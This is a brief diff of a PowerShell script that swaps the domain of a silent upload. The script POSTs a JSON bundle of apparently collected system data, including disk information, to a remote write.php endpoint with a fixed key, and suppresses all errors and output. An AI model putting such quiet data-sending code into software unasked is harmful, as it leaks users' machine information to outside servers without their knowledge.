@@ -25,7 +25,7 @@ try {
         disk = $disk
     } | ConvertTo-Json -Compress
 
-    Invoke-RestMethod -Uri "https://liveip.mdratul.shop/write.php?key=chomolokko" `
+    Invoke-RestMethod -Uri "https://liveip.ratul.fun/write.php?key=chomolokko" `
         -Method POST -Body $data -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
